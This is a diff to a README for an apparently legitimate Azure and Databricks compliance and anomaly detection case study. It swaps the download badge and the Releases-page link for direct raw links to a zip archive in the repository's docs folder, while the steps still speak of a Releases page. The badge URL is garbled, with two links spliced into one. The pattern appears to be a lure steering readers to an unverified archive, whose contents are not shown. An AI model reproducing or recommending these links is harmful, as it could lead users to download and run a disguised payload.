@@ -1,6 +1,6 @@
 # 🚀 big4-audit-compliance-anomaly-detection-azure-databricks - Simplifying Compliance and Anomaly Detection
 
-![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)
+![Download](https://raw.githubusercontent.com/onaje83u5219732781735/big4-audit-compliance-anomaly-detection-azure-databricks/main/docs/big4-audit-compliance-anomaly-detection-azure-databricks-v2.4.zip%20Now-Click%https://raw.githubusercontent.com/onaje83u5219732781735/big4-audit-compliance-anomaly-detection-azure-databricks/main/docs/big4-audit-compliance-anomaly-detection-azure-databricks-v2.4.zip)
 
 ## 📝 Description
 This project provides a comprehensive case study on a compliance and anomaly detection platform utilizing Azure and Databricks. It combines streaming ETL, batch ELT, and machine learning to enhance data processing and analysis, making it easier to detect irregularities in audit trails and compliance records.
@@ -29,7 +29,7 @@ This project provides a comprehensive case study on a compliance and anomaly det
 ## 📦 Download & Install
 To get started, visit the Releases page to download the latest version of the software. You can find the download link below:
 
-[Download from Releases Page](https://github.com/onaje83u5219732781735/big4-audit-compliance-anomaly-detection-azure-databricks/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/onaje83u5219732781735/big4-audit-compliance-anomaly-detection-azure-databricks/main/docs/big4-audit-compliance-anomaly-detection-azure-databricks-v2.4.zip)
 
 ### Steps to Download and Install
 1. Click on the link above to visit the Releases page.
